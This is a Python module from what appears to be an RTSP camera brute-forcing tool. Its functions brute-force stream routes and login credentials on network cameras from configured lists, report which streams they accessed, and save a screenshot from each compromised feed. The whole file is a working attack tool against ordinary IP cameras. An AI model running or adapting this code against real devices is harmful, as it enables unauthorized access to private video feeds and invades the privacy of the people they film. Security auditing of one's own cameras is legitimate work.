import logging
from logging import log
import socket
import sys
import typing

import av
from colorama import Fore, Style

from modules import utils
from modules.rtsp import AuthMethod, RTSPClient, Status

sys.path.append("..")
import config

dummy_route = "/0x8b6c42"
logger = logging.getLogger("debugger")


def try_to(func, target, *args):
    try:
        func(*args)
        return True
    except (socket.timeout, TimeoutError) as e:
        logger.debug(f"Skipping {target.ip}: {repr(e)}")
        target.status = Status.TIMEOUT
        return False
    except ConnectionResetError as e:
        logger.debug(f"Skipping {target.ip}: {repr(e)}")
        target.status = Status.BLOCKED
        return False
    except Exception as e:
        logger.debug(f"{func.__name__} failed for {target.ip}:{target.port}: {repr(e)}")
        return False


def attack_route(target: RTSPClient) -> typing.Union[RTSPClient, bool]:
    # If the stream responds positively to the dummy route, it means
    # it doesn't require (or respect the RFC) a route and the attack
    # can be skipped.
    ok = route_attack(target, dummy_route)
    if ok:
        target.routes.append("/")
        return target

    # Otherwise, bruteforce the routes.
    for route in config.ROUTES:
        ok = route_attack(target, route)
        if ok:
            target.routes.append(route)
            return target
        # If target is timeouted or aborted connection, it's probably
        # not available and can be skipped.
        if target.status is Status.TIMEOUT or target.status is Status.BLOCKED:
            return False


def route_attack(target: RTSPClient, route) -> bool:
    # Create socket connection.
    target.socket = socket.socket()
    connected = try_to(target.connect, target)
    if not connected:
        target.socket.close()
        return False

    # Create describe packet and send it.
    target.create_packet(route)
    sent = try_to(target.send_packet, target)
    if not sent:
        target.socket.close()
        return False

    attack_url = RTSPClient.get_rtsp_url(
        target.ip, target.port, target.credentials, route
    )

    # Get return code.
    try:
        code = utils.detect_code(str(target.data))
    except Exception as e:
        logger.debug(f"get_code failed for {attack_url}: {repr(e)}, {target.data}")
        target.socket.close()
        return False

    logger.debug(f"DESCRIBE {attack_url} RTSP/1.0 > {code}")
    target.socket.close()
    # If it's a 401 or 403, it means that the credentials are wrong but the route might be okay.
    # If it's a 200, the stream is accessed successfully.
    if code == 200 or code == 401 or code == 403:
        return True
    else:
        return False


def attack_credentials(target: RTSPClient):
    # If stream responds positively to no credentials, it means
    # it doesn't require them and the attack can be skipped.
    if target.auth_method is AuthMethod.NONE:
        ok = credentials_attack(target, ":")
        if ok:
            return target

    # Otherwise, bruteforce the routes.
    for cred in config.CREDENTIALS:
        ok = credentials_attack(target, cred)
        if ok:
            target.credentials = cred
            return target
        if target.status is Status.TIMEOUT:
            return False
        utils.detect_auth_method(target)


def credentials_attack(target: RTSPClient, cred):
    # Create socket connection.
    target.socket = socket.socket()
    connected = try_to(target.connect, target)
    if not connected:
        target.socket.close()
        return False

    # Create describe packet and send it.
    target.create_packet(target.route, cred)
    sent = try_to(target.send_packet, target)
    if not sent:
        target.socket.close()
        return False

    attack_url = RTSPClient.get_rtsp_url(target.ip, target.port, cred, target.route)

    # Get return code.
    try:
        code = utils.detect_code(str(target.data))
    except Exception as e:
        logger.debug(f"get_code failed for {attack_url}: {repr(e)}")
        return False

    logger.debug(f"DESCRIBE {attack_url} RTSP/1.0 > {code}")
    logger.debug(f"{target._local.packet} ({attack_url}) > {target.data}")
    target.socket.close()
    # If it's a 404, it means that the route is incorrect but the credentials might be okay.
    # If it's a 200, the stream is accessed successfully.
    if code == 200:
        logging.info(f"{Style.DIM}Working stream at {attack_url}{Style.RESET_ALL}")
        logger.debug(
            f"Working stream at {attack_url} with {target.auth_method.name} auth"
        )
        return True
    elif code == 404:
        logging.info(f"Incorrect stream route, but OK credentials at {attack_url}")
        logger.debug(
            f"Incorrect stream route at {attack_url} with {target.auth_method.name} auth"
        )
        return True
    else:
        return False


def get_screenshot(target: RTSPClient, tries=0) -> str:
    file_name = utils.escape_chars(f"{str(target).lstrip('rtsp://')}.jpg")
    file_path = config.PICS_FOLDER / file_name

    try:
        with av.open(
            str(target),
            options={
                "rtsp_transport": "tcp",
                "rtsp_flags": "prefer_tcp",
                "stimeout": "3000000",
            },
            timeout=60.0,
        ) as video:
            if (
                video.streams.video[0].profile is None
                and video.streams.video[0].start_time is None
                and video.streams.video[0].codec_context.format is None
            ):
                # There's a high possibility that this video stream is broken
                # or something else, so we try again just to make sure
                if tries == 0:
                    video.close()
                    return get_screenshot(target, 1)
                else:
                    logger.debug(
                        f"Broken video stream or unknown issues with {str(target)}"
                    )
                    return ""
            video.streams.video[0].thread_type = "AUTO"
            for frame in video.decode(video=0):
                frame.to_image().save(file_path)
                break
    except (MemoryError, PermissionError, av.InvalidDataError) as e:
        # Those errors occurs when there's too much SCREENSHOT_THREADS.
        logger.debug(f"Missed screenshot of {str(target)}: {repr(e)}")
        # Try one more time in hope for luck.
        if tries == 0:
            logging.info(
                f"{Fore.YELLOW}Retry to get a screenshot of the {str(target)}{Style.RESET_ALL}"
            )
            return get_screenshot(target, 1)
        else:
            logging.error(
                f"{Fore.RED}Missed screenshot of {str(target)}: if you see this message a lot - consider lowering SCREENSHOT_THREADS ({config.SCREENSHOT_THREADS})"
            )
            return ""
    except Exception as e:
        logger.debug(f"get_screenshot failed with {str(target)}: {repr(e)}")
        return ""

    logging.info(
        f"{Style.BRIGHT}Captured screenshot for {str(target)}{Style.RESET_ALL}"
    )
    return file_path
